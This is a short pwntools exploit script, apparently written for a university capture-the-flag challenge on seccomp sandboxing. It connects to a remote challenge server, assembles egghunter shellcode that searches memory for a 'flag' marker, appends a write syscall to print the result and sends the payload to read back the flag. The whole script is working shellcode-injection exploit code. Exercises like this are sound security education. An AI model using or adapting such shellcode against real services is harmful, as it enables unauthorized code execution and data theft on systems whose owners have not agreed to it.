from pwn import *
context.arch = 'amd64'
binary = './chal.bin'

e = ELF(binary)

#p = process(binary)
p = remote("cse4850-seccomp-1.chals.io", 443, ssl=True, sni="cse4850-seccomp-1.chals.io")


flag_location  = shellcraft.amd64.linux.egghunter(b'flag',  0x600054)
print_flag = shellcraft.amd64.linux.write(1, 'rdi', 100)

asm_flag_location  = asm(flag_location)
asm_print_flag = asm(print_flag)

code = asm_flag_location + asm_print_flag

p.recvuntil(b'>>>')

p.sendline(code)

# this line was given by Louie because for some reason regular recvline() closed without a flag and using 2 caused sendline() to somehow break
print("flag"+p.recvline().decode('utf-8').strip())
